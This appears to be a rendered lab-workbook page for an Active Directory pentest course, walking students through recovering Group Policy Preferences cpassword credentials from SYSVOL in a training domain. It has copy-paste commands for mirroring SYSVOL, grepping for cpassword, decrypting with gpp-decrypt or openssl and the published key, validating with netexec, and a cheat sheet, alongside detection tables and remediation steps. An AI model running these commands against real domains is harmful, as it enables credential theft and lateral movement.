+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>smbclient<span class="w"> </span>//corp-dc01/SYSVOL<span class="w"> </span>-U<span class="w"> </span><span class="s2">&quot;CORP\j.chen%Welcome2026#&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="w">  </span>-c<span class="w"> </span><span class="s2">&quot;recurse on; prompt off; mget *&quot;</span>
+</code></pre></div>
+<p>Downloads the full SYSVOL tree to your current working directory.</p>
+<h3 id="grep-find-for-sysvol-inspection">grep + find for SYSVOL inspection</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>grep<span class="w"> </span>-rE<span class="w"> </span><span class="s1">&#39;cpassword=&quot;[^&quot;]+&quot;&#39;</span><span class="w"> </span>SYSVOL/
+</code></pre></div>
+<p>Returns every line containing a <code>cpassword</code> attribute across the dump.</p>
+<h3 id="manual-openssl-decryption-if-gpp-decrypt-is-missing">Manual openssl decryption (if gpp-decrypt is missing)</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="nb">echo</span><span class="w"> </span>-n<span class="w"> </span><span class="s1">&#39;&lt;base64-cipher&gt;=&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>openssl<span class="w"> </span>enc<span class="w"> </span>-d<span class="w"> </span>-aes-256-cbc<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="w">  </span>-K<span class="w"> </span>4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="w">  </span>-iv<span class="w"> </span><span class="m">00000000000000000000000000000000</span><span class="w"> </span>-base64<span class="w"> </span><span class="p">|</span><span class="w"> </span>iconv<span class="w"> </span>-f<span class="w"> </span>UTF-16LE<span class="w"> </span>-t<span class="w"> </span>UTF-8
+</code></pre></div>
+<p>The <code>=</code> padding restoration matters. GPP strips trailing <code>=</code>; openssl needs them. Pad the base64 string until its length is a multiple of 4.</p>
+<hr />
+<h2 id="walkthrough">Walkthrough</h2>
+<h3 id="step-1-confirm-your-scope-token">Step 1: Confirm Your Scope Token</h3>
+<p>The platform injects your scope token as <code>OCR_SCOPE_TOKEN</code>. Workbook commands reference <code>${OCR_SCOPE_TOKEN}</code> directly so you can paste them as-is. Make sure the variable is set first.</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Confirm scope token</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$OCR_SCOPE_TOKEN</span><span class="s2">&quot;</span>
+</code></pre></div>
+<p>Should print a 4-character lowercase string (e.g. <code>j001</code>). If empty, <code>export OCR_SCOPE_TOKEN=&lt;your_token&gt;</code> from the lab dashboard banner.</p>
+</div>
+<h3 id="step-2-mirror-sysvol-locally">Step 2: Mirror SYSVOL Locally</h3>
+<p>SYSVOL is the replicated GPO/script share served by every DC. Reading it is normal: every domain-joined machine pulls SYSVOL on every Group Policy refresh, so SYSVOL reads do not get logged or alerted on by default. Mirror the entire tree to local disk in one shot, then grep at leisure.</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Pull the entire SYSVOL share to disk</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>mkdir<span class="w"> </span>-p<span class="w"> </span>~/work/adpt-2-02<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">cd</span><span class="w"> </span>~/work/adpt-2-02
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>smbclient<span class="w"> </span>//corp-dc01/SYSVOL<span class="w"> </span>-U<span class="w"> </span><span class="s2">&quot;CORP\j.chen%Welcome2026#&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="w">  </span>-c<span class="w"> </span><span class="s2">&quot;recurse on; prompt off; mget *&quot;</span>
+</code></pre></div>
+<p>What each piece does:</p>
+<ul>
+<li><code>mkdir -p ~/work/adpt-2-02 &amp;&amp; cd ...</code> create a working directory and switch to it. <code>mkdir -p</code> does not error if it already exists. <code>&amp;&amp;</code> runs the second command only if the first succeeded.</li>
+<li><code>smbclient //corp-dc01/SYSVOL</code> UNC path to the SYSVOL share. SYSVOL is a default share on every DC; <code>j.chen</code> (any authenticated domain user) has read access by design.</li>
+<li><code>-U "CORP\j.chen%Welcome2026#"</code> credential bundle.</li>
+<li><code>-c "recurse on; prompt off; mget *"</code> non-interactive command list:<ul>
+<li><code>recurse on</code> recurse into subdirectories on subsequent operations.</li>
+<li><code>prompt off</code> do not ask for confirmation per-file (without this, <code>mget</code> prompts before each download).</li>
+<li><code>mget *</code> download every file in the current directory and (with recurse on) every subdirectory.</li>
+</ul>
+</li>
+</ul>
+<p>The download takes seconds. SYSVOL on a freshly built domain is a few MB; on a real production domain expect tens to hundreds of MB.</p>
+</div>
+<h3 id="step-3-hunt-for-cpassword">Step 3: Hunt for cpassword</h3>
+<p>The whole tree is now in your local CWD. Grep recursively for the <code>cpassword=</code> attribute. Note: this is one of those rare cases where grep on local files is faster + safer than grep over SMB (no rate limit, no audit footprint after the initial mirror).</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Find every cpassword attribute</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>grep<span class="w"> </span>-rE<span class="w"> </span><span class="s1">&#39;cpassword=&quot;[^&quot;]+&quot;&#39;</span><span class="w"> </span>.<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-20
+</code></pre></div>
+<p>What each option does:</p>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Effect</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>-r</code></td>
+<td>Recurse into subdirectories.</td>
+</tr>
+<tr>
+<td><code>-E</code></td>
+<td>Extended regex (so <code>[^"]+</code> works without escaping).</td>
+</tr>
+<tr>
+<td><code>'cpassword="[^"]+"'</code></td>
+<td>Match the literal <code>cpassword="...something not a quote..."</code>. The <code>[^"]+</code> greedy-matches up to the closing quote.</td>
+</tr>
+<tr>
+<td><code>.</code></td>
+<td>Search starting from current directory.</td>
+</tr>
+<tr>
+<td><code>\| head -20</code></td>
+<td>Cap at 20 matches; production SYSVOLs sometimes have many.</td>
+</tr>
+</tbody>
+</table>
+<p>On Nordport's SYSVOL you will find a <code>Groups.xml</code> under the Default Domain Policy GUID (<code>{31B2F340-016D-11D2-945F-00C04FB984F9}</code>) containing one User entry per scope token. Each User node has a <code>name="svc_gpp_&lt;token&gt;"</code> and a <code>cpassword="..."</code>.</p>
+</div>
+<h3 id="step-4-filter-to-your-token">Step 4: Filter to Your Token</h3>
+<p>Each student has a per-token User entry in the same Groups.xml. Extract just yours.</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Pull just your User entry</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>grep<span class="w"> </span>-A1<span class="w"> </span>-E<span class="w"> </span><span class="s2">&quot;name=\&quot;svc_gpp_</span><span class="si">${</span><span class="nv">OCR_SCOPE_TOKEN</span><span class="si">}</span><span class="s2">\&quot;&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="w">  </span>./corp.nordport.local/Policies/<span class="se">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="se">\}</span>/Machine/Preferences/Groups/Groups.xml
+</code></pre></div>
+<p>What each piece does:</p>
+<ul>
+<li><code>-A1</code> print 1 line of context AFTER each match. The XML is structured so the <code>&lt;Properties cpassword="..."&gt;</code> line follows the <code>&lt;User name="..."&gt;</code> line.</li>
+<li><code>-E</code> extended regex; needed for the escaped double-quote class.</li>
+<li>The XML path: SYSVOL contents under each domain are organized as <code>&lt;domain&gt;/Policies/&lt;GPO-GUID&gt;/Machine/Preferences/&lt;type&gt;/&lt;type&gt;.xml</code>. The Default Domain Policy GUID is the constant <code>{31B2F340-016D-11D2-945F-00C04FB984F9}</code> (the same on every domain).</li>
+<li>The braces in the path need backslash-escaping in bash because <code>{...}</code> is brace expansion syntax.</li>
+</ul>
+<p>The output shows the <code>&lt;User ...&gt;</code> line and the next line containing the <code>Properties</code> element with the <code>cpassword</code>. Extract the cpassword value.</p>
+</div>
+<p>A more surgical extract that returns ONLY the cpassword string:</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - One-liner to get just your cpassword string</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="nv">XML</span><span class="o">=</span>./corp.nordport.local/Policies/<span class="se">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="se">\}</span>/Machine/Preferences/Groups/Groups.xml
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>grep<span class="w"> </span>-E<span class="w"> </span><span class="s2">&quot;userName=\&quot;svc_gpp_</span><span class="si">${</span><span class="nv">OCR_SCOPE_TOKEN</span><span class="si">}</span><span class="s2">\&quot;&quot;</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$XML</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="w">  </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-oE<span class="w"> </span><span class="s1">&#39;cpassword=&quot;[^&quot;]+&quot;&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-1
+</code></pre></div>
+<p>What each piece does:</p>
+<ul>
+<li><code>XML=...</code> shell variable holding the file path. Saves typing the long path twice.</li>
+<li>First <code>grep -E "userName=...\"$OCR_SCOPE_TOKEN\""</code> filter to lines mentioning your specific user.</li>
+<li>Pipe to <code>grep -oE 'cpassword="[^"]+"'</code>:<ul>
+<li><code>-o</code> only print the matched substring.</li>
+<li><code>-E</code> extended regex.</li>
+<li>The pattern matches <code>cpassword="..."</code> literal.</li>
+</ul>
+</li>
+<li><code>| head -1</code> take only the first match (defensive; should be exactly one).</li>
+</ul>
+</div>
+<h3 id="step-5-decrypt">Step 5: Decrypt</h3>
+<p><code>gpp-decrypt</code> is a small Ruby tool shipped on Kali. It hardcodes the published Microsoft AES-256 key and the all-zero IV, so it requires no arguments other than the cpassword.</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Decrypt with gpp-decrypt</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>gpp-decrypt<span class="w"> </span><span class="s1">&#39;&lt;paste your cpassword value here&gt;&#39;</span>
+</code></pre></div>
+<p>What this does:</p>
+<ul>
+<li>Takes the base64-encoded ciphertext as the only argument.</li>
+<li>Restores the trailing <code>=</code> padding that GPP strips.</li>
+<li>AES-256-CBC decrypts using the published key (<code>4e9906e8fcb66cc9...</code>).</li>
+<li>Strips PKCS7 padding from the plaintext.</li>
+<li>Decodes the resulting bytes as UTF-16 LE (Windows passwords are stored UTF-16 LE internally).</li>
+</ul>
+<p>The output is the plaintext password for <code>svc_gpp_&lt;token&gt;</code>. If the cpassword has unusual characters or the tool errors, fall back to manual openssl: <code>echo -n '&lt;cpassword&gt;=' | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 00000000000000000000000000000000 -base64 | iconv -f UTF-16LE -t UTF-8</code>.</p>
+</div>
+<h3 id="step-6-authenticate-as-the-recovered-account">Step 6: Authenticate as the Recovered Account</h3>
+<p>Confirm the cracked credential works against the DC. Validating before using it for the actual share read tells you the decryption worked AND the account is enabled.</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Validate svc_gpp_<token></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>netexec<span class="w"> </span>smb<span class="w"> </span>corp-dc01<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;svc_gpp_</span><span class="si">${</span><span class="nv">OCR_SCOPE_TOKEN</span><span class="si">}</span><span class="s2">&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&lt;recovered password&gt;&#39;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="w">  </span>-d<span class="w"> </span>corp.nordport.local
+</code></pre></div>
+<p>Same netexec auth check pattern from earlier exercises: <code>[+]</code> means success, <code>[-]</code> with <code>STATUS_LOGON_FAILURE</code> means the password is wrong (probably a copy-paste issue with the cpassword), <code>[-]</code> with <code>STATUS_ACCOUNT_DISABLED</code> means the account exists but is disabled.</p>
+</div>
+<h3 id="step-7-read-the-token-scoped-flag">Step 7: Read the Token-Scoped Flag</h3>
+<p>The recovered svc_gpp account has read access to a per-token directory under the <code>\\corp-dc01\GPPFlags\</code> share. The directory ACL grants read ONLY to the matching svc_gpp account (and Domain Admins / SYSTEM); other students' svc_gpp accounts cannot read your directory.</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Pull the flag file from your scoped directory</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>smbclient<span class="w"> </span><span class="s2">&quot;//corp-dc01/GPPFlags&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="w">  </span>-U<span class="w"> </span><span class="s2">&quot;CORP\\svc_gpp_</span><span class="si">${</span><span class="nv">OCR_SCOPE_TOKEN</span><span class="si">}</span><span class="s2">%&lt;recovered password&gt;&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="w">  </span>-c<span class="w"> </span><span class="s2">&quot;cd </span><span class="si">${</span><span class="nv">OCR_SCOPE_TOKEN</span><span class="si">}</span><span class="s2">; get FLAG.txt&quot;</span>
+<a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>cat<span class="w"> </span>FLAG.txt
+</code></pre></div>
+<p>What each piece does:</p>
+<ul>
+<li><code>//corp-dc01/GPPFlags</code> UNC path to the per-exercise share (created by setup-adpt-dc.ps1).</li>
+<li><code>-U "CORP\\svc_gpp_${OCR_SCOPE_TOKEN}%..."</code> authenticate as the recovered account, NOT as j.chen. The double-backslash inside double-quotes escapes to a single backslash for smbclient's parser.</li>
+<li><code>-c "cd ${OCR_SCOPE_TOKEN}; get FLAG.txt"</code> non-interactive: cd into the per-token subdirectory, then download the flag file.</li>
+<li><code>cat FLAG.txt</code> print the contents.</li>
+</ul>
+<p>The file holds a flag string in the form <code>OCR{...}</code>. Submit it on the platform.</p>
+</div>
+<hr />
+<h2 id="blue-team-perspective">Blue Team Perspective</h2>
+<p>Reading SYSVOL is normal client behavior; every domain-joined computer reads it on every Group Policy refresh. The detection signals therefore have to be more nuanced than "file was read".</p>
+<table>
+<thead>
+<tr>
+<th>Activity</th>
+<th>Event ID</th>
+<th>Where it fires</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>SYSVOL share access from Kali</td>
+<td>5140 (network share access)</td>
+<td>DC Security log</td>
+</tr>
+<tr>
+<td>Recursive directory traversal</td>
+<td>4663 burst</td>
+<td>DC Security log (if object access auditing on SYSVOL)</td>
+</tr>
+<tr>
+<td>GPP XML containing cpassword</td>
+<td>Custom SIEM rule on file content</td>
+<td>File integrity monitor</td>
+</tr>
+<tr>
+<td>Service account login from new IP</td>
+<td>4624 logon type 3</td>
+<td>Target server Security log</td>
+</tr>
+</tbody>
+</table>
+<div class="admonition info">
+<p class="admonition-title">What SOCs typically catch</p>
+<p>Few defenders monitor reads on SYSVOL because GPO refreshes generate baseline noise. The detection that does work is on the <strong>use</strong> of the recovered credential: a service account never logs on interactively, and any 4624 logon for <code>svc_gpp_*</code> outside its expected hosts is a strong indicator. File integrity monitoring on SYSVOL with a regex match for <code>cpassword="</code> flags the artifact for the blue team's quarterly hunt list.</p>
+</div>
+<h2 id="hardening-note">Hardening Note</h2>
+<p>The remediation order matters: rotate first, then delete. Deleting the XML before rotating leaves every machine that consumed the policy with the old password still active.</p>
+<div class="admonition tip">
+<p class="admonition-title">GPP cpassword remediation steps</p>
+<ul>
+<li>Rotate the password of every account referenced in a GPP XML on every host that may have applied the policy.</li>
+<li>Edit each offending GPO via GPMC and remove the GPP entry through the UI; verify the resulting XML no longer contains <code>cpassword</code>.</li>
+<li>Run <code>dfsrdiag replicationstate</code> on every DC to confirm the deletion replicated.</li>
+<li>Migrate local-admin password management to <strong>LAPS / Windows LAPS</strong>; service-account use to <strong>gMSAs</strong>.</li>
+<li>Add a SIEM detection: file integrity monitor on <code>SYSVOL\**\Preferences\**\*.xml</code> matching <code>cpassword="</code>.</li>
+<li>Audit older backups; expired credentials in restored snapshots are still useful to an attacker who can read the snapshot.</li>
+</ul>
+</div>
+<hr />
+<h3 id="record-your-findings">Record Your Findings</h3>
+<blockquote>
+<p><strong>GPP file with cpassword:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>(path under SYSVOL)
+</code></pre></div>
+<p><strong>Recovered password for svc_gpp_<token>:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>(do not paste this in a real engagement report; treat as live credential)
+</code></pre></div>
+<p><strong>Flag:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>(OCR{...})
+</code></pre></div>
+</blockquote>
+<hr />
+<h2 id="analysis-questions">Analysis Questions</h2>
+<p><strong>1. Microsoft published the GPP AES key in MSDN. Why? And what does that decision tell you about the company's threat model at the time?</strong></p>
+<details class="note">
+<summary>Reveal Answer</summary>
+<p>Microsoft published the key as part of the GPP reference documentation so third-party tooling could read and write the same XML format. The threat model assumed the security boundary lived above the SYSVOL filesystem: only authenticated domain users could read SYSVOL, and authenticated domain users were considered trusted enough to know local admin passwords. That assumption broke the moment any authenticated domain user was untrusted (compromised account, contractor, intern). The episode is a textbook case of confusing "obfuscation" with "encryption." Real encryption requires that knowing the algorithm and ciphertext does not yield the plaintext without a secret. Publishing the key inverted that. Modern Group Policy alternatives (LAPS for local admin, gMSAs for service accounts) keep the secret out of SYSVOL entirely.</p>
+</details>
+<p><strong>2. SYSVOL replicates between DCs. If a defender deletes the offending Groups.xml on one DC, what could go wrong, and how should the deletion be done correctly?</strong></p>
+<details class="note">
+<summary>Reveal Answer</summary>
+<p>SYSVOL replicates via DFS-R (or the older FRS on legacy domains). Deleting a file on one DC normally propagates the deletion to every other DC. Two failure modes appear: (a) DFS-R replication backlogs hide deletions for hours or days during which the file is still readable on lagging DCs; (b) some operators delete the GPP XML on the file system but not the corresponding GPO container, leaving an orphaned policy that GPMC reports as broken. The correct procedure is to use Group Policy Management Console to edit the GPO and remove the GPP entry through the UI (which writes a clean XML without the cpassword and increments the GPO version number), then verify replication on every DC with <code>repadmin /showrepl</code> and <code>dfsrdiag replicationstate</code>. After that, <strong>rotate the leaked password</strong> on every machine that may have used it. Deletion alone is not sufficient because backups and snapshots may still contain the original.</p>
+</details>
+<p><strong>3. The published key is for AES-256-CBC with a zero IV and UTF-16LE plaintext. Walk through the decryption math at the byte level.</strong></p>
+<details class="note">
+<summary>Reveal Answer</summary>
+<ol>
+<li>Take the base64 ciphertext, restore trailing <code>=</code> padding to a length that is a multiple of 4, base64-decode to raw bytes. 2. Initialize an AES-256-CBC decryptor with the 32-byte key (<code>4e9906...</code>) and a 16-byte zero IV. 3. Decrypt the ciphertext, yielding plaintext bytes plus PKCS7 padding. 4. Strip PKCS7 padding (the last byte tells you how many padding bytes to strip; verify each padding byte equals that count). 5. Decode the remaining bytes as UTF-16 LE (every printable ASCII character takes two bytes, with the high byte being zero). 6. The resulting string is the plaintext password. The reason UTF-16 LE is used is that Windows internally stores user passwords as UTF-16 LE Unicode strings; GPP simply round-trips the same encoding through AES.</li>
+</ol>
+</details>
+<hr />
+<h2 id="key-takeaways">Key Takeaways</h2>
+<ul>
+<li>The GPP AES key is public; any cpassword in any reachable SYSVOL is plaintext to anyone who can read the file.</li>
+<li>Five XML schemas may contain cpassword: Groups, Services, ScheduledTasks, DataSources, Drives, Printers. Search them all.</li>
+<li>SYSVOL is readable by any authenticated domain user, so the bar for triggering this finding is low.</li>
+<li>Deletion of cpassword entries is not enough; rotate every leaked credential on every machine that used it.</li>
+<li>Modern alternatives (LAPS for local admin, gMSAs for service accounts) keep the secret off SYSVOL entirely.</li>
+</ul>
+<h2 id="cheat-sheet-recap">Cheat Sheet Recap</h2>
+<p>The four operations below cover the entire find-decrypt-use loop. Pin this card; SYSVOL is the cheapest finding in any internal pentest of a long-lived AD.</p>
+<table>
+<thead>
+<tr>
+<th>Goal</th>
+<th>Command</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Mirror SYSVOL locally</td>
+<td><code>smbclient //&lt;dc&gt;/SYSVOL -U "&lt;DOMAIN&gt;\&lt;user&gt;%&lt;pw&gt;" -c "recurse on; prompt off; mget *"</code></td>
+</tr>
+<tr>
+<td>Hunt cpassword strings</td>
+<td><code>grep -rE 'cpassword="[^"]+"' .</code></td>
+</tr>
+<tr>
+<td>Decrypt a cpassword</td>
+<td><code>gpp-decrypt '&lt;base64-cipher&gt;'</code></td>
+</tr>
+<tr>
+<td>Validate the recovered cred</td>
+<td><code>netexec smb &lt;dc&gt; -u &lt;recovered-user&gt; -p '&lt;plain&gt;' -d &lt;domain&gt;</code></td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="spaced-repetition">Spaced Repetition</h2>
+<p><strong>Card 1: GPP cpassword Decryption</strong></p>
+<p>Q: What command decrypts a GPP cpassword string <code>j1Uyj3Vx...</code> on Kali, and what is the underlying algorithm?</p>
+<details class="note">
+<summary>Answer</summary>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>gpp-decrypt<span class="w"> </span><span class="s1">&#39;j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw&#39;</span>
+</code></pre></div>
+<p>Algorithm: AES-256-CBC with the published 32-byte key starting <code>4e9906e8fcb66cc9...</code>, 16-byte zero IV, plaintext encoded as UTF-16 LE, ciphertext base64 with stripped trailing padding.</p>
+</details>
+<p><strong>Card 2: cpassword File Locations</strong></p>
+<p>Q: Name five XML file types in SYSVOL that may contain a cpassword attribute.</p>
+<details class="note">
+<summary>Answer</summary>
+<p><code>Groups.xml</code>, <code>Services.xml</code>, <code>ScheduledTasks.xml</code>, <code>DataSources.xml</code>, <code>Drives.xml</code>, <code>Printers.xml</code>. All under <code>\\&lt;domain&gt;\SYSVOL\&lt;domain&gt;\Policies\&lt;GUID&gt;\Machine\Preferences\&lt;Type&gt;\</code>. Always grep for <code>cpassword="</code> recursively rather than guessing which file type the operator used.</p>
+</details>
+<p><strong>Card 3: SYSVOL Mirror in One Command</strong></p>
+<p>Q: Write the smbclient command to recursively download all of SYSVOL from <code>corp-dc01</code> as <code>j.smith</code> / <code>Pass#</code>.</p>
+<details class="note">
+<summary>Answer</summary>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>smbclient<span class="w"> </span>//corp-dc01/SYSVOL<span class="w"> </span>-U<span class="w"> </span><span class="s2">&quot;CORP\j.smith%Pass#&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="w">  </span>-c<span class="w"> </span><span class="s2">&quot;recurse on; prompt off; mget *&quot;</span>
+</code></pre></div>
+<p>Run from an empty working directory; the entire SYSVOL tree mirrors below your CWD. SYSVOL is typically only a few MB on a small domain.</p>
+</details>
+<p><strong>Card 4: MS14-025</strong></p>
+<p>Q: What did MS14-025 do, and what did it explicitly NOT do?</p>
+<details class="note">
+<summary>Answer</summary>
+<p>It removed the GUI affordances that let administrators create new GPP cpassword entries through gpedit.msc. It did NOT delete or rewrite existing entries already in SYSVOL, did NOT rotate any leaked passwords, and did NOT change client-side GPP processing (so old entries still apply policy). The artifact survives indefinitely until an administrator manually removes the entries and rotates the passwords.</p>
+</details>
+<p><strong>Card 5: openssl Fallback Decryption</strong></p>
+<p>Q: If <code>gpp-decrypt</code> is missing, write the openssl command to decrypt a GPP cpassword.</p>
+<details class="note">
+<summary>Answer</summary>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="nb">echo</span><span class="w"> </span>-n<span class="w"> </span><span class="s1">&#39;&lt;base64+padding&gt;&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>openssl<span class="w"> </span>enc<span class="w"> </span>-d<span class="w"> </span>-aes-256-cbc<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a><span class="w">  </span>-K<span class="w"> </span>4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a><span class="w">  </span>-iv<span class="w"> </span><span class="m">00000000000000000000000000000000</span><span class="w"> </span>-base64<span class="w"> </span><span class="p">|</span><span class="w"> </span>iconv<span class="w"> </span>-f<span class="w"> </span>UTF-16LE<span class="w"> </span>-t<span class="w"> </span>UTF-8
+</code></pre></div>
+<p>Restore the <code>=</code> padding to a multiple of 4 first. The <code>iconv</code> step converts the UTF-16 LE plaintext back to UTF-8 for terminal display.</p>
+</details>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.instant", "navigation.tracking", "navigation.sections", "navigation.expand", "navigation.top", "content.code.copy"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+        <script src="../../javascripts/mermaid-fix.js?v=4"></script>
+      
+        <script src="../../javascripts/pdf-export.js?v=2"></script>
+      
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
+      
+    
+  </body>
+</html>
